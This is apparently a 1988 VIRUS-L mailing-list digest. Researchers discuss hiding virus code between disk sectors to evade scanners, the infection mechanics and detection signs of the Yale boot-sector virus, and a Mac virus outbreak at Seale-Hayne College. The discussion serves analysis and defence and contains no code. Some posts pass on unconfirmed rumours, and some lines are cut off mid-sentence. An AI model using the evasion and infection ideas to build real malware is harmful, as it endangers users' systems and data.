If there's physical space there, then I'm sure that it can be done.
You have to remember a couple things though.  First, the virus would
need some "bootstrap" code that would have to reside in a program(s)
which is accessible to DOS, or else the space in between sectors would
be ignored.  Also, the virus would become very hardware specific.
Certainly floppy disks and hard disks (yet alone different models of
hard disk controllers, etc.) have different physical characteristics
in this regard.  Imho, the bottom line is that writing such a virus
would not be feasible, or at least cost (of time) efficient.

Subject:      Virus insurance


Recently, on the RISKS forum (I believe), there's been some discussion about
virus insurance.  Specifically, about how corporations are seeking virus
clauses in their computer security insurance policies.  The posting said that
at least one (insurance) underwriter has started specifically rejecting any
virus coverage at all.  The insurance companies seem to feel that they need to
learn more about viruses before being able to insure against them.  Apparently
it could cause security policies to specify much higher deductibles, etc.  I
thought that it could be an interesting topic for discussion...  Any thoughts?
If *you* were representing an insurance company, would *you* want to recommend
insuring against viruses?  Of course, this would not be limited to PCs and/or
mainframes.

BITNET, being store-and-forward, gives smaller messages priority over
larger ones.  That could possibly explain the ordering problems.  The
list should still be served by LISTSERV@LEHIIBM1.BITNET unless you're
on a local redistribution list.  We are, however, slowly looking to
pick up a peer LISTSERV or two sometime in the future.

Subject:      Viruses Between Sectors

A few weeks back, Joe, Chris Bracy and I were all called
out to California to test a new anti-viral package of a
company which none of us have anything to do with  (That
company will remain nameless).

They asked us to put their package through the ringer and
see if we could figure out a way to get a virus through
all their defenses.  We found several.

One of the ideas we kicked around, which had been conceived
by some of Fred Cohen's students a few years ago, was hiding
a large part of the viral code in between sectors.  We
wouldn't have to specify that sectors were bad, or change
file sizes or anything that a program might catch.  A program
can't really check between sectors because its unsure of
what would be there.

The virus would still have to be a boot sector virus or
hide in an executable or so on.  We felt the best combination
was to have the virus attack the boot sector.

This would be a difficult virus to work with and a difficult
one to write, but not impossible by any means.  The real problem
is that we are very limited in space, although we can point to
each of the between-sector areas.

Remember that viruses can hide anywhere.  On old Apple II's,
we've heard of viruses being able to be hidden in memory other
than the main memory, little pieces hidden around the system.

There is no easy way to check for code in these sectors other
than mapping them and CRCing whatever junk might be written
there, and checking it periodically, but this is unreliable.
Its far easier to watch for the main program in the boot
sector, executables, memory, BIOS and so on.

Subject:      computer functionality b/w timed virus attacks

The idea of a box that computes only one function certainly falls within
the definition of a computer.  Every computer I ever met satisfies that
one.  Any computer with finite memory is only capable of computing one
function: executing its machine code with finite input and environment.
Each program is merely a point in the domain of the function of the
computer.  After all, to a computer, programs are the real input.  Data
is just junk for the programs to munch on.

When viewed from this perspective, the problem of computer infection
becomes: how can a program alter the computer's actual input (programs)?
In general, computer programs map some language expressed in the form
of data into the domain of the computer's execution function.  As such,
most data can be viewed as a program running on a virtual machine being
emulated by the program actually running on the computer.  In the case
of interpreters and compilers, the language of the data may be suffic-
iently rich for data infection to propagate.  But usually the data does
not have sufficient semantics to alter other programs or data.  Punching
the keys on a calculator or microwave are types of data that fall into
the latter class.

Generalizing the idea a bit, we can see that any computer program is
a simulator for some virtual machine.  Almost every one of these virtual
machines is a more limited machine than the actual computer it is being
simulated by. (Possible exceptions: compilers, interpreters, assemblers.)
So the idea of exploiting limited functionality for virus prevention is
inherent in the use of computer programs.

Virus infection from the data angle is never likely to be a problem
because it is too difficult compared to good ol' code infection.  How
do you devise data that makes your accounting package crash your hard
disk?  And if you CAN, how can it propagate?  The virtual machines
provided by most computer programs are too limited to be infected.
My theory is that virus attacks will almost invariably come from code-
altering techniques.  If so, calculators, microwaves, and security doors
will always be safe because their actual data (code) is permanent and
unwriteable.

Also:

Somebody put forth this scenario earlier:
Timed virus crashes a system;
Staff loads last dump;
Dump crashes system too;
Staff loads older dump, etc. until successful.
By this time system has lost months of work.

Not so; the appropriate response to such a virus attack is to perform
the previous actions until a working system is found, then to reset the
system clock to sometime in the past and reload your last dump.  The
recent work can then be salvaged (mostly, hopefully).

Even if the virus is counting executions of itself for timing, tape
archive formats usually allow selective retrieval of data; once a
successful system is found, the latest data can be undumped and cleaned
up.

   I can understand trying to keep virus-writing technology under wraps,
because if no one understands how to write a virus, there probably won't
be any viruses.  But it's too late.  The concept is already out and
its feasibility has been amply demonstrated.  It's naive to think that I
or anyone else couldn't write a virus without 'details' supplied from
someone else (the 'details' are already there and freely available in the
form of programmer's manuals).  I personally don't feel I would need
*any* help writing a virus if that's what I set my heart on doing (but I
don't want to and I have better things to do).  On the other hand I think
that the fewer people there are who understand the guts of viruses, the
fewer there will be who will write anti-virus programs.  I may be
wrong, but I think you need to know more to write an anti-virus program
(like what viruses are out there and how they work) than you need to know
to write a virus.

   As far as the origins of PC viruses are concerned, one has to ask if
there is anyone out there who can reap financial gains from viruses.
The answer is yes.  Companies that sell software are competing with
freeware.  If they can make people afraid of freeware (because of risk
of virus infection), then they can sell more software (including the
antidote for particular viruses, including any they may have written and
released themselves in trojan-horse freeware or apparently pirated
versions of their own software).  Would a software company resort to such
tactics?  What are the risks of such a company getting caught by someone
tracing trojan-horse freeware back to it?

   About virus insurance...  I tend to think of insurance companies as
only slightly better than virus-writers.  Because viruses are so new and
because it's so hard to predict what the future holds in the way of new
and innovative viruses I would expect the rates to be astronomical, with
how astronomical depending on what the machine was being used for and
what you expected the insurance company to protect you from (financial
loss due to loss of records [*that* could get expensive!]?  the cost of
having your system cleaned and up and running again after a virus
attack?).  However, the rates would undoubtably improve significantly if
the insurance company imposed on the insured the simple common-sense
hygiene of the type that Ken recommended (rotating backups, etc.),
which I think is by far the best insurance, and/or imposed virus
detection/prevention measures.

It's a good topic of discussion, but I would have preferred it if no
specific company names were mentioned.  I'd appreciate everyone's
cooperation on keeping this, and other future discussions,
non-commercial - please.  This list originates on BITNET, and we must
adhere to their non-commercial guidelines.  Thanks.

Anyway, I'm always a little bit wary of companies that promise the
world, as it were.  I'd be willing to bet that the fine print in the
product's manual (if there is one) was a little bit more, er, specific
than the add that you got in the mail.  Perhaps not, but that would
certainly be the exception, not the rule.

Of course!  Let's remember that a virus need not be overtly
destructive; it may merely wish to alter data, or perhaps even extract
data.  A hypothetical scenario could be: company A wishes to give
competitor company B a bad name, so they covertly release a virus
which infects company B's product - not to destroy it per se, but to
have it give intermittently incorrect results, thereby destroying its
credibility.

On openness: I agree that there are people who are intelligent enough to
write viruses without help. However, it is pretty much certain that the
nVIR Mac virus was created by someone who took the "sample virus" from
CompuServe and turned it into a real nuisance.

On viruses and software companies: We can even go better than Company A
trying to discredit Company B; the Scores virus was apparently constructed
specifically to damage and discredit a program or programs wriiten for some
unnamed government installation by a disgruntled employee.

This is an interesting origin of viruses.  I have heard of this type of
virus/trojan horse in a specific case (which I won't mention because it
might discredit the company associated with it more than necessary).
Incidently, the bad code WAS traced back to the original company because
their company name and phone number were located in the executable
code... (How's that for doing something stupid??)  Anyway, what do
*you* think about the idea that software firms might be releasing
damaging code in order to discredit other packages and increase their
sales while wreaking havoc on *our* machines?!? Do *you* think that
this mentality is incorporated into the scheme of selling more
software???

Speaking of Flushot bugs...

Hasn't *ANYONE* out there tried FluShot Plus 1.4??? I am having one
type of problem with it (bug?), but because no one else out there tries
such software, I am not sure if it is a *major* bug that everyone is
experiencing, or just my bug.

The only problem that I have encountered since using it for almost a
month is that when I read a floppy disk (and only about 80% of the
time) I get a TSR screen from FSP+ telling me that CMOS is being
changed.  Question: Does anyone know if reading a floppy drive DOES in
fact change CMOS memory in an AT???

Product names in the context of objective reviews from people with no
vested interest in the product is perfectly acceptable.  Reprints of
advertisements, however, must be discouraged.

On another note, I believe that the mail duplication problem reported
earlier is isolated to BITNET.  If anyone reading this is getting
multiple copies on Internet (or elsewhere), please take a look at your
message header.  Is it going through the ARPA gateway at CUNYVM?
If so, then the message is travelling through BITNET for a short
distance before hitting the ARPAnet/Internet and the problem would be
isolated between here and CUNY.  If someone on the ARPA/Internet who
is getting duplicate messages could send me a copy of one of their
mail headers, I'd appreciate it.  If someone on ARPA/Internet could
confirm to me that they're *not* getting multiple messages, I'd
appreciate that too.  Networks are great...when they work.  Heavy
sigh.

Let's suppose that the refunding will cost them 10 bucks (for banking

Subject:      The Yale Virus - Revealed

Okay,

We've spent the last few hours going over the Yale virus
(Actually, Chris Bracy is still playing with it right now!)
and we've come up with some preliminary conclusions.

It isn't the Brain virus.  At least as far as it isn't
the code that WE have that is called the Brain virus, and
I believe we have the original form.  I think its an act-a-like.
Someone tried to recreate the virus without having the original
to study from.

Its a boot-sector virus which infects both system and data
disks.  It infects only on boot-up.   If you cold boot an
infected disk, it loads the virus; if you then warm boot
the machine, it infects whatever is in the A: drive.  If
the disk in the A: drive is already infected, it does nothing.

It traps Int 9 and Int 19.  Int 9 is the keyboard interrupt
and Int 19 is the reboot interrupt.

When it infects the disk, it copies the original boot sector
to sector eight (the ninth sector).

It also traps <ctr> <alt> <I> (the key configuration that
changes the number of lines on a screen).

There is also a section of code which is an exact format
of 1 track of a disk, EXCEPT the Int 13 isn't there, so
this section of code never does anything.

Also, there is a generation counter.

I believe this is an early version of a virus that someone
planned to release.  I'm not sure if the final version was
released, and I'm not sure this virus is limited to Yale.
I don't believe it is limited to Yale.

I believe that the final version of the virus, after a period
of time, would trigger itself to reformat someone's disk
tracks.

As we finish going over the code, we'll be back to you with
any new info.

Subject:      Viruses in the Mail

I'd like to thank everyone to date who has sent me copies
of their particular viruses.  Its interesting to go over
them and try to figure out if they are advanced versions
of other viruses floating around out there that we may
be able to stop.

For anyone sending them to me in the future, however,
please LABEL them as viruses.  Receiving brown paper wrappers
of unlabelled disks in the mail is scary.   Recently when
Yale sent me some material to look at, they marked the disk
"BAD VIRUS - DO NOT BOOT".  That was great, and one of
the few times someone has marked it for me.

We generally place viruses on red disks and put a "Mister Yuck"
sticker on them as well as labelling them viruses.  Its easier
to separate them.

In the future, its dangerous to be sending viruses around, so
we do discourage it, BUT if anyone wants us to work on theirs
(this is not an ad, I don't get paid for it) I'd like to
change the address they've been going to.   Send them to
P.O. Box 2423, Lehigh Valley Pa, 18001.  This will make it
easier for me to separate what are viruses and what are not.

Also, if you send me something, please send me some background
information, "I found it ____, and it infected ___ disks,
on ___ date"  or "I wrote this for you to look at" and so on.
I've found a lot of programs that I can't trace back anywhere
because all I've gotten is a disk and a postmark.

As for sending disks around, we can better control who has
copies or reviews the virus in a conference situation, so I'd
prefer people see them there.  I don't intend on sending out
copies of the Lehigh Virus or the Brain Virus (which I've received
NUMEROUS calls for) unless you are "okay'd" by the government
or have a real need for something.  Otherwise, we can discuss
it at the conference.

Thanks,

Excuse me, I didn't fully explain where the boot sector

It is put on Sector 8 of Track 40, EVEN if it is an 80

mark this sector as being bad.  If something is in this
sector, it doesn't check, it just writes right over it.

Subject:      Scary Fact about the Yale Virus

Here is something that should scare people about viruse
propogation.

The version of the Yale virus that we have tells us that
it is the 15th generation of the virus.  There is a counter
that keeps this information.   (The value of the counters
found at Yale were 212 through 215).   Figuring that each
copy made 2 of itself and knowing how it figures out its
own generation, the number of copies out there is about
   15
  2    which translates into an aweful lot of copies of
this virus if these figures are correct, and means that Yale
was not the first place to encounter this virus.

A way to tell if you have the virus, when you warm reboot,
the screen is set to 40 column mode for a split second.

Watch for it folks,

The generation on my disk is 15 hex not decimal.  Also the note I saw
said they didnt find any earlier than 12H.  This would seem to
indicate that either it didnt start at 0, or there is a good chance it
didnt start at Yale.

We're interested in finding out more about where it did come from, so
here are some specifics on spotting it...

On computers with CGA adapters on a warm boot when it infects a disk (or
attempts to infect and doesn't) it will put the screen into 40 column mode
for about a second (on an 8Mhz PC).

The generation count is a word located at 1F8 into the code.  (Into
the boot sector).

Also it doesnt overwrite (re-infect) itself.

Chris.

How can you ask for an OKAY from the government on people??? Who okay's
you to receive these viruses?  Living in the same city as you, it
scares me, and the rest of the computing vicinity, that these viruses
are being so uncarefully handled. I just hope that my brother hasn't
used any floppy disks that you might have handed him in conjunction
with my computer....

If you *really* wanted to educate us, you would make a fact sheet about
*all* the viruses you know of (containing infection schemes, sizes,
generations, geographical siting, detection of, remedies, etc.) and let
the discussion list add to it.

Also, what is the synopsis of Goldwater-Koch Privacy Act?? If you
like, I have pages and pages of government document references on
computer security type subjects and maybe we can compile a
"government revue" on viruses and such together.

Well, that is certainly a pretty impressive CLAIM.  However, after reading
(usually passively) a good deal of the postings here on the list, I would
tend to think it a little optimistic.  Of course, it is hardly the first
such claim in computer software advertising.

At $99, I would hope the program would be fairly sophisticated and useful
in preventing many (or at least some) viral infections.  However, I believe
that ANY security scheme can be broken with enough effort.  About the only
ABSOLUTE security (if there is such a thing) wwould be physical security of
the system, with only the use of material (program OR data) which had been
verified to be virus- (or other type bug-) free.  And that even probably
isn't possible.

As for the liberal money-back guarantee:  it may be good, but it is only as
good as the company.  In other words, it can be like the "life-time" member-
ship to the health spa that goes out of business 6 months after you join;
the problem is in the definition of "lifetime".

That is a good point about whether the money-back guarantee is really
worth anything.  The redemption rate on such guarantees is, I believe,
quite low in most all fields.  The computer software field is probably
no different.  As to the lifetime of computer software firms, we KNOW
that this is in many (probably most) cases quite short.  Therefore, there
is a good chance the firm won't be around for 5 years.

As to selling software here; it is not appropriate.  What IS appropriate is
for users of software reporting (positively or negatively) on how it performs.
Of course, its human nature that we usually hear more of the negative. (Or
it could be just that there IS more negative when it comes to the vast array
of software).

I am very offended.  We take the utmost care in isolating
virus programs and in studying them.  We set up a computer
in my Coopersburg office (which you should be familiar with)
which is connected to nothing whatsoever so that we can
play with them in a controlled environment.  We have no
programs on disk there, and nothing gets transfered from
there so there is no risk of propogation.

I debated whether to send this directly to David or to
the entire list, and I feel that the list should know
that we NEVER compromise on security.

I had just gotten through explaining that some of the
people who have submitted viruses to us should be more
careful about how they are sent, and that we will not
give out copies of the Lehigh virus or Brain virus, and
you tell me that the computing vacinity is scared of me?

I just want to make sure that no one accuses me of the
same thing Fred Cohen has been accused of countless times.
I do not test viruses on public machines, only dedicated
machines which are connected to NOTHING whatsoever.

As I said about two weeks ago on this list, and we discussed
it at length, I am putting together such a list.  One of
the reasons we are getting viruses in the mail is because
people are helping me to add to the list.  We debug them,
figure out what makes them tick, compare them to similar
viruses and do a write up on them for the list of viruses.

Unfortunatly, this list is taking longer than anticipated.

Once again, however, I would like to ask anyone to send me
information about their virus sitings, please be specific.

Please forgive the rather angry tone, I don't like being
accused of viral propogation... at least not after all the
work I have gone through to make certain nothing propogates.

Is the academic based research of computer viruses a big thing in the
States? In Canada? Anywhere?
By "academic based", I mean is there a specific portion of a university
computing science department devoted to unravelling the code of these
things, inventing security measures to prevent their spread, hiring
graduate students to write/examine them, applying to major industries
for grants to combat them, and so on.

Just curious. If this violates national security or something, then
you don't have to tell me. Is Lehigh like this? All the contributors
have obviously been exposed to the Lehigh virus or know of it.

When you discuss a package such as the IMMUNIZER for a hundred bucks,
how can it have as much sophistication and road testing as FluShot
(for free)??? And we *know* how many problems Ross Greenberg has had with
getting FSP to work with ALL types of systems...

Loren,

You seem fine with a word processor, but how do people *really* know
that what you say is true and that you would *never* spread a virus???
I mean sending an unknown person a lot of viruses is a potential for danger.
I know you and know that you would never release a virus on any system, but
can you see the situation that would arise if someone else out there also
got a copy of the viruses "to study" but instead had other plans for them!
As it stands, sending you viruses HAS to be a weak link in security because
I doubt that most of the places sending to you have even met you in person.

do both work on my system and kill it? Do both write themselves on new disks?

That all depends on how the two viruses function.  For example, if one
of the two viruses infects the boot track and another appends itself
onto executable files, then it's certainly possible to have two active
viruses on one system.  Each one would act independently of the other.
If they both infect the boot track, however, then the results would
depend on how "well" each virus is written.  That is, if they go to
great extremes to make sure that the existing boot track is stored in
an unused place, and that it gets executed normally, then it's
possible that both would function normally.  It would seem more
likely, however, that the end result would be a no-longer-bootable
disk...  The bottom line is that it depends on how the two viruses
were written.

I can't say anything about PC viruses, but the Mac viruses I know about would
have no trouble with such a situation. The cleanup programs might, though!

Subject:      More administravia (re: duplicate mail)

Heavy sigh!

After much experimentation, I've been able to definitively isolate the
mail duplication gnome to be hiding between here and the
BITNET/ARPANET gateway.  It does, however, appear to have been fixed.
Please let me know if anyone gets a duplicate of *this* particular
message.

For anyone who's interested - I tried sending mail directly from
LEHIIBM1 (where VIRUS-L originates) to my own Internet account on
spot.cc.lehigh.edu.  I found that one message was being sent.  Also,
my own account was only receiving one copy of all VIRUS-L mail.  So,
the duplication was happening somewhere in BITNET.

Next, I received several headers from people receiving duplicate mail
(thank you all!) and saw that the headers were all identical.  More
importantly, though, all of the affected people had similar mail
paths.  One person told me that mail from other sites was not being
duplicated.  Since we're on a small "leg" off of the BITNET, chances
were pretty good that the problem was somewhere there...

Finally, I sent myself mail on my Internet account, but I directed it
through the INTERBIT (INTERNET/BITNET) gateway at CUNY.  I received a
duplicate copy of my own mail.  I *suspect* that it was the CUNYVM
mailer that was doing it, but I could be wrong.  It has been having
other problems lately, I'm told.

When I again tried my loopback test this morning, I got no duplicate
mail, and the mail went through CUNY in a matter of seconds.  I
believe that the problem is fixed.

Once again, I apologize to all who were inconvenienced by this.  I
hope that we've seen the end of it.

Putting locks on a floppy drive can be sensible in a "big business" type
situation to make sure that unauthorized I/O access is disallowed.  This
security is kind of mirrored in some brands of PCs that have key locks on
their frames that won't allow bootup with being "unlocked" first or
physically can't be opened (without total destruction of the hardware)
without the key.

The group of us that study viruses at Lehigh University are
not a section of the computer science department.  In the
general sense, we have been working in the field as consultants
for a number of years.  Some of our clients include government
bodies.  When such a large security problem as the "virus"
makes itself known, we have to study it in order to come up
with some effective way of combatting it.  Its very important
that we CAN combat it.

I highly doubt it.  When Chris Bracy, Joe Sieczkowski, Mitch
Ludwig and I ran around Lehigh campus for 48 hours trying
desperately to stop the virus from spreading (it spread at
an incredible rate), we were, as was the Computer Center
Staff, more worried about the danger to research at Lehigh.

Most of the follow up interest in the virus was money or
recognition.  Several people came to Lehigh to find out
about the Lehigh virus so they could make money from anti
virus programs.  Several others became involved because
of the publicity that came out of the virus.

Viruses are a curiosity, but I would rather find a way to
stop the curiosity that play with it.

As for some questions about national security.  We are
prohibited by law of giving out certain viruses.  We are
not allowed to distribute the Lehigh Virus without the
"ok" of the government as I am told.   I spent some time
on the phone quite a while ago with different agencies
and that was the general idea.

Well David,

There are quite a few anti-virus programs which sell for 200-400
dollars.  The reason some sell for so much is that they are worth
more.

I believe Ross Greenberg's FluShot is shareware, so I believe he
asks you to send in some sum of money.  I don't recall it being
free.  But even if it is, is it worth trying a package that has
failed so often before?  FS is an interesting package, but it
isn't all that powerful in comparison with some of the packages
on the market.

For a corporate market, often they might want a shell of
some kind to make sure nothing comes through.  There are
packages that have had extensive testing by the NSC I'm
told, there are packages that utilize DER encryption schemes
which is much better than trying a simple CRC.

I would pay at least 5 times as much for a DER encryption
than for a CRC scheme.  You have to realize that the value
of the product is worth what was put into it.

Konrad,

You raised a very interesting question with two viruses
on the same machine.  Several people, I believe, have already
answered the question, but I'd like to point out that the
game Corewars is an example of what you are talking about
in some ways.

For anyone who hasn't played the game Corewars, or seen
its write-up a few years back in Scientific American, the
idea is to write assembly-like programs which look for
other programs and destroy them.  People can have programs
dual and destroy each other.  Its a very interesting and
challenging game to come up with the perfect program.

If you are so worried about me leaking viruses, please keep
your distance.

In point of fact, as I said just two days ago, it is unwise
to send viruses around.  I said that I didn't appreciate the
one virus I received in a brown wrapper with no letter and
no disk label.  This annoyed me.  I didn't say "Send me all
your viruses".  Please look at the context of my letters
before you critisize.  (I'm taking complaints on my replies
to you!)

If you don't trust me to handle viruses, that is just fine
and isn't the point.  I have been called upon to handle
viruses in the past, and I was called by one person today
who had a problem and I will continue to deal with these
viruses.

I understand the security risks associated with giving out
viruses, that is why people generally send viruses to Fred
Cohen or Chris Bracy or me or someone who has dealt with
virus problems in the past.

Well, it turns out that I jumped the gun a bit when I said that all was
fixed.  But, then, that's quite apparent by now...  It also turns out that
several lists are experiencing the same problem right now (according to a
LISTSERV group of list maintainers), and no one really knows what the cause
is.  That doesn't explain why some of my personal mail has been getting
duplicated, however...

So, until the problem gets fixed (it's quite out of my hands I'm afraid),
lets please just try to bear with it.  Discussing it on the list only adds
insult to injury.

Thanks again to everyone who's been sending me headers and additional

Hello everybody,

from all the lists I've subscribed, VIRUS-L delivers by far the most
messages per day, and it takes considerable time to keep in pace.
Please help all make browsing through all this mail a bit easier and
faster.

1. Please discuss technical matters, as distributing problems, privately
   with the list owner -- Ken Van Wyk <LUKEN at LEHIIBM1> and perhaps
   Jim Eshleman <LUJCE at LEHIIBM1>, in this case -- and do NOT bother
   every subscriber with it.  When Ken needs evidence from other sub-
   scribers, he will certainly tell us so (that makes one note instead
   of a dozen).

2. Please use the subject field sensibly.  When you report/discuss
   details prevalent to a specific brand of hardware or software,
   please indicate so in the Subject field.  In many cases, I could
   figure out this indispensible bit of information hardly, or even
   not at all.

   You could do it e.g. in this way:
   > Subject:   Super-duper Virus Killer available (MS-DOS)
   So all Mac userers could discard this one, immediately.
   (I'd appreciate especially, if this scheme worked the other way :-)

Please keep discussion on this (technical) suggestion at a minimum, and
no flames, please.

Thanks!

     I have questions (gee..what a suprise!)  If you formatted your hard
disk into several partitions, and had one partition just for COMMAND.COM,
IBMBIOS.COM, IBMDOS.COM, CONFIG.SYS, etc...., how effective would that be
in slowing down the spread of virii?  If you ran MIRROR (or something similar)
for your extended DOS partition (which is logical drive "D" now), how effective
would this be for restoring any data that was destroyed?

     If you ran MAPMEM (which shows hooked vectors), could you see what vectors
a virus might have hooked for itself?  Could you then free up that portion by
using RELEASE on it?  (assuming you ran MARK first.....)

then just say so.  I have no problem with that.  However do not imply

Don't know if you heard this one, but here is something that sounds like what
you were saying.  Softgaurd Corp. was caught distributing a virus called SUG.
SUG was advertised as a copy-protection breaker of Softguard products.
Instead, the program scrambled FATs in an IBM; from drive A to the highest
drive.  Softguard claimed that since users trying out the program were
breaking a licensing agreement, the company had the right to destroy data.
Softgaurd's going to court.

Not very effective at all, by itself.  There is at least one
anti-virus device which can (hardware) write protect a range of
cylinders on your hard disk (i.e., a partition).  It would definitely
reduce the threat of a virus spreading if you could put your system
files (and as many executables, overlays, etc.) on a write protected
device like that.  The problem is that it's not to convenient to use,
and you should really understand what you're doing while you have the
disk not write-protected.  That is, while installing software on that
partition, you're as open as ever to virus contamination.

Sometimes.  MAPMEM, by itself, only reports the most recently run
program that is taking any one interrupt vector.  That is, if two
programs took INT 13H, then only the second one run would be reported.
There is an accompanying (I think in the same package, by TurboPower
Software) program called WATCH which causes MAPMEM to show all
programs which have taken any particular interrupt.  As long as a
virus loads *AFTER* WATCH, then it should show any interrupts in use.
The problem, however, comes in when a virus, such as a boot sector
virus, is loaded before anything else.  You won't be able to see any
of the interrupts that they're using with tools like MAPMEM.

MAPMEM, WATCH, MARK, RELEASE, and others that I can't remember the
names of, are public domain programs released by TurboPower Software.
They're written in Turbo Pascal and include source code.  Good stuff.

Subject:      Safeguard and SUG


Frank San Miguel related an incident involving a "virus" called SUG that
scrambles FAT tables and generally destroys data.  This is no reflection
on Frank, but having never heard this before it seems hard to believe
that a company could be so irresponsible.  If it's true I wonder if it's
a real virus (that propagates) or just a nasty program that reformats
disks.  Whether it propagates or not, it's clear that the program has no
way of discriminating between someone simply trying to make a backup copy
of a program (or perhaps trying to install it on a hard disk) and someone
trying to make pirate copies of a disk.  In any case, it would appear
that the company has gone out on a limb by "taking the law into its own
hands" rather than pursuing justice through legal channels.  Even if it
is justified in trying to protect its software, and even if it argues
that legal channels are ineffective, that is no excuse for criminal
action (releasing a malicious and destructive program).  I would think
that such a company would be no more justified than a mob lynching
criminal.  The criminal may deserve to die, but it should be handled
through proper channels and the punishment must befit the crime, as
determined by law.

I have a feeling that the program distributed by Softgard (if the report
is true) is a Trojan Horse rather than a virus.  Since most users will have
to reformat after having their FAT's scrambled, I'm not sure the program
could propagate.  In any case, the company would not NEED to have the program
propagate to accomplish their (assumed) ends.

Even if it doesn't propagate, I agree that the practice is reprehensible.
While I don't condone pirating of software, users should be able to make
backups, which some copy protection schemes don't provide for.  I've never
particularly cared for copy-protected software anyway.

In Wisconsin, as in other states, a person may shoot to kill if and
only if s/he feels that a life is threatened.  (A reasonable person
test is often invoked.)  It is not permitted to do so to protect only
property.  That is to say, the response must be appropriate to the
threat and the invoker of the response must take responsibility for
his or her action.

If a company does put out such a package that does harm to a user's
computer, and if the harm is way out of bound compared to what is
being protected, the company is due to be sued, either by a felon,
using the program to steal, or, more to the point, by an innocent
bystander who may well be using the program in a legal way, or who may
be merely damaged by some uninteded side effect.

In fact, if I was aware of such a problem with a commercial package,
if I felt that a vendor was prepared to risk my computer for his
protection, I would avoid the legal packages that the vendor sold,
believing that there were some other dirty tricks hidden in the
woodwork that had not bitten anyone yet.

Loren, I am afraid that I cannot document it, and it may even have been
apocryphal.  (I was not a user of the net then.)  But the first virus
that I can recall hearing about was named the "phantom," and was said to
have appeared in the arpanet in the very early seventies.  After all
these years I can no longer distinguish in my memeory between those
characteristics that were attributed to the phantom and those that were
simply discussed in its context.

I can recall that I was not surprised at the time and that I was
surprised at FC's assertion that his experiment was the first.  Of
course that is absurd on its face since "The Adolescence of P1" was
published in the early 70's.  It described "trapdoors," "Trojan Horses,"
and viruses in excruciating and withering detail.  These were the
"kernel of truth" on which the author hung his fantasy.

the history you don't know."

I have been asked to forward the following article on to you, in the hope that
someone may be able to offer advice and/or assistance.  The report concerns a
recent outbreak of a Macintosh virus at Seale-Hayne College.  We have been in
touch with the local Apple Centre in Bristol, who in turn have contacted Apple
UK's technical people, and it would appear that this particular virus is
unknown to them.  If anyone does have any information regarding this virus,
could they mail either myself or Adrian Vranch at Seale-Hayne - his address is
given in the report.

Thank you,

Introduction

The following notes describe the recent events leading up to the discovery
of what appears to be a "virus" of some form which is present in the
Macintosh Plus computers in use at Seale-Hayne College.  This virus was
discovered completely by accident on Wednesday 29th June 1988 and
appears to have been present,but undetected, for at least six months prior
to that date on a Macintosh network running under MacServe.  This
network has been accessed by over 150 staff and student users in that
time.  These notes are intended to help all Macintosh users  by providing
information about this virus in terms of:

         how users can determine if it is present

         what effects it appears to have

         how to get rid of it.


Discovery of the Virus - The Story So Far

The first clue to the presence of the virus came as a complete accident
while using Apple File Exchange on a Mac Plus with external 20 Mbyte
hard disk.  Along with the Desktop file ( which is normally invisible ),
System File and other files shown in the scroll window was a new, invisible
file called Bostb be Evill.  At the time I thought that this was rather
strange but did nothing whatsoever on that day. Due to the unfriendly ring
to the name of this file, my suspicions were aroused and the next day I ran
the Ferret v1.0 program to check for Scores Virus.  Vaccine had been
installed and running for two weeks on this system.  Ferret identified two
files that were infected on the hard disk system:

         the main System file in the System Folder

and      a second System file ( used to create MacServe floppies ) in
         another folder called MacServe Folder.

No changes to the Scrapbook or Note Pad icons had taken place, as
discussed in the Scores Virus article by Howard Upchurch.  However,
following the advice in Howard's notes I checked for additional INIT
resources in the infected System files using ResEdit.  Sure enough, both
contained an extra INIT with i.d.of 6

        "LoadAT" ID=6

Howard suggests in his notes that INIT resources with i.d. of 6, 10 or 17 in
a System file show that the file is infected.  No extra Desktop file was found
in the System Folder as described by Howard Upchurch in his notes
relating to Scores Virus.

Using the Repair option in Ferret, at the stage where infection was
identified in the message box, removed the INIT resource with i.d. of 6.
Subsequent runs of Ferret gave a clean bill of health for the whole disk,
including these two System files.  I later established that deleting the INIT
i.d.of 6 resources using ResEdit would also remove "infection"as detected by
Ferret.

At this stage I deleted the Bostb be Evill file using ResEdit.  I have never
seen this file on any Macintosh since.

My attention turned next to the College network of five Macintosh Plus
computers sharing a 20 Mbyte hard disk and two Imagewriters.  Since the
MacServe System file on the separate Macintosh Plus had been infected I
thought it likely that the System files on the network hard disk would be
similarly infected.  This proved to be true, again with the same INIT
resource with i.d. of 6, again in the main System file and in the System file
in the MacServe volume containing a System Folder for creating MacServe
floppies for users.

The infection dates given by Ferret were particularly interesting:

        main System file - Wed 29th June 1988 at 21:15

        MacServe folder System file - Fri Dec 18th 1987 09:30.

Assuming that these dates are correct, this shows that the virus had been
present on this shared hard disk for at least six months, but had only
transferred to the main System file itself the day before.  As far as
verifying the time is concerned, it is possible that someone was using the
network at 21:15 hours ,as the room was open to users then.  It is certain
that the network was running at that time.

At this stage, no files similar to the Bostb be Evill file were found on the
MacServe network hard disk.

The infection date of December 18th for the System file used to create
MacServe floppies suggested that all such floppies created after that date
would also be infected.  On checking, I found that all MacServe floppies
have an infected System file with the added "LoadAT" INIT resource, i.d.of
6.  All users of these floppies have been notified of the problem.

It would appear that the virus was first introduced to the MacServe
network and that it was transferred in the MacServe folder copied to the
separate Macintosh Plus with hard disk.  From the MacServe folder on this
separate Mac, the infection then spread to the main System file in this
computer.  The date when the Bostb be Evill file appeared is not known
but I believe that this file appeared after the MacServe System file with
the INIT resource "LoadAT" i.d.6  had been copied to the separate
Macintosh and this belief is based on what happened next with the
MacServe network system.

On returning to the MacServe network and switching on to run Ferret again
, no virus was found on the disk.  However, ResEdit showed the existence of
a new invisible file with a four character name of box symbols.  The system
was switched off then restarted the following day.  Again, Ferret detected
no virus but a further two invisible files had been added to the desktop
and were shown using ResEdit.  One had the same four character name of
boxes and the other was called Tsunami.  Apparently, this is the name of a
Japanese tidal wave which starts in a small way and grows rapidly to
engulf everything in its path - again not a very friendly name for an
invisible file on disk !

I assumed that these three files were similar to the original Bostb be
Evill file found on the other Macintosh but rather than delete them, I
decided to use ResEdit to investigate.  The results were very interesting:

         all three files had no apparent type or creator

         all three were locked, invisible,Bozo and File Protect selected

         all three had the same resource fork size of 286 bytes

         all three had the same data fork size of 512 bytes .

Furthermore, all three showed a blank window when opened from the first
ResEdit window.  In other words, although they contained data and
resources, ResEdit could not show them up.


Effects of the Infection

At first, it appeared that there were no specific problems caused by the
infection.  Examination of application CODE resources as described in the
Scores Virus notes did not show any evidence of the added codes with i.d.
numbers two greater than the next value, as described by Howard
Upchurch.

However, it has now become clear that this infection does appear to cause
